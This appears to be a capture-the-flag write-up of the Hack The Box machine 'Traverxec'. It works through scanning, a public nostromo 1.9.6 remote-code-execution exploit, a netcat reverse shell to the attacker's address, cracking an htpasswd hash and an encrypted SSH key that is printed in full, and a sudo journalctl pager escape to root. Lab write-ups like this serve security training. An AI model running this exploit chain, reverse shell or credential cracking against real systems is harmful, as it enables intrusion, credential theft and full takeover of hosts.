# Traverxec

## IP: 10.10.10.165

## OS: Linux

### Enumeration

```bash
$ nmap -vvv -sCV -oN traverxec.nmap 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 06:54 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating Ping Scan at 06:54
Scanning 10.10.10.165 [2 ports]
Completed Ping Scan at 06:54, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:54
Completed Parallel DNS resolution of 1 host. at 06:54, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 06:54
Scanning 10.10.10.165 [1000 ports]
Discovered open port 22/tcp on 10.10.10.165
Discovered open port 80/tcp on 10.10.10.165
Completed Connect Scan at 06:54, 5.43s elapsed (1000 total ports)
Initiating Service scan at 06:54
Scanning 2 services on 10.10.10.165
Completed Service scan at 06:54, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.165.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 1.73s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Nmap scan report for 10.10.10.165
Host is up, received syn-ack (0.049s latency).
Scanned at 2020-04-07 06:54:19 CDT for 14s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

No passwordless SSH authentication allowed.


```bash
$ whatweb -v -a 3 http://10.10.10.165:80 | tee whatweb-color-10.10.10.165-80.log
WhatWeb report for http://10.10.10.165:80
Status    : 200 OK
Title     : TRAVERXEC
IP        : 10.10.10.165
Country   : RESERVED, ZZ

Summary   : Bootstrap, JQuery, HTTPServer[nostromo 1.9.6], HTML5, Script

Detected Plugins:
[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with
        HTML, CSS, and JS.

        Website     : https://getbootstrap.com/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        String       : nostromo 1.9.6 (from server string)
```

```bash
$ searchsploit nostromo 1.9.6
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
                                                        | (/usr/share/exploitdb/)
-------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                  | exploits/multiple/remote/47837.py
-------------------------------------------------------- ---------------------------------
Shellcodes: No Result
Papers: No Result

$ searchsploit -m exploits/multiple/remote/47837.py
# Read script and figure out how it works.
$ python 47837.py 10.10.10.165 80 whoami
www-data
```

This gets us command execution. Let's get a reverse shell.

`$ python 47837.py 10.10.10.165 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.11 1234 >/tmp/f"
`

```bash
$ nc -lvnp 1234
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ # Ctrl-Z
# Local shell
$ stty echo -raw; fg
www-data@traverxec:/usr/bin$ export TERM=xterm-256color
www-data@traverxec:/usr/bin$ export SHELL=bash
www-data@traverxec:/usr/bin$ clear
```

### User Privesc 

I spin up a Python webserver on my local machine with `$ python3 -m http.server 8000` and use `wget` on the remote machine to pull down `LinEnum.sh` into the `/tmp` directory, `chmod +x` it and run it.

```bash
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

I put the line with the hash into its own file and run `john` on it to see if I can crack it.

```bash
john htpasswd -w=~/tools/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:39 DONE (2020-04-07 07:21) 0.02540g/s 268760p/s 268760c/s 268760C/s Noyoo..Noury
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Looks like the password for `david` is `Nowonly4me`.


After exploring the box for a bit, I found this:

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Using a bit of intuition, I tried to `cd /home/david/public_www` and succeeded, even though `cd /home/david/ && ls` failed.

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
```

Looks handy. Let's extract this to `/tmp`.

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ cd /tmp
www-data@traverxec:/tmp$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz .
www-data@traverxec:/tmp$ mkdir data
www-data@traverxec:/tmp$ tar xzvf backup-ssh-identity-files.tgz -C /tmp/data
www-data@traverxec:/tmp$ cd data/home/david/.ssh/
www-data@traverxec:/tmp/data/home/david/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
www-data@traverxec:/tmp/data/home/david/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

Time to break out `john` to crack this encrypted RSA key. Save this key to a file and run `john` like this:

```bash
$ ssh2john.py david_id_rsa > ssh2john.david_id_rsa
$ john ssh2john.david_id_rsa -w=~/tools/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (david_id_rsa)
1g 0:00:00:04 DONE (2020-04-07 08:58) 0.2004g/s 2874Kp/s 2874Kc/s 2874KC/s *7¡Vamos!..clarus
Session completed
```

The cracked password is `hunter`. Let's try to use this key to `ssh` into the machine.

```bash
$ chmod 700 david_id_rsa
$ ssh david@10.10.10.165 -i david_id_rsa
Enter passphrase for key 'david_id_rsa': # hunter
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Apr  7 01:01:28 2020 from 10.10.14.15
david@traverxec:~$ wc user.txt
 1  1 33 user.txt
```

And there is our user proof.

### Root Privesc

There's a peculiar shell script in `/home/david/bin/server-stats.sh`.

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Running this script does **not** prompt us for a sudo password. This is a fantastic sign. I checked out the `journalctl` page on [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/) and found that `journalctl` invokes the default pager, which is normally `less`. We can see that `less` has root privileges with: 

```bash
david@traverxec:~/bin$ ls -l `which less`
-rwxr-xr-x 1 root root 166664 May  7  2018 /usr/bin/less
```

We can use a standard `less` escape to get a `root` shell. I copy the `server-stats.sh` file to `server-stats.2.sh`, and remove the `| /usr/bin/cat` from the last line. I run the script with `$ ./server-stats.2.sh` and land in a `less` process. Typing `!/bin/bash` and hitting `ENTER` gives me a `root` shell.

```bash
root@traverxec:/home/david/bin# whoami
root
root@traverxec:/home/david/bin# wc /root/root.txt
 1  1 33 /root/root.txt
```
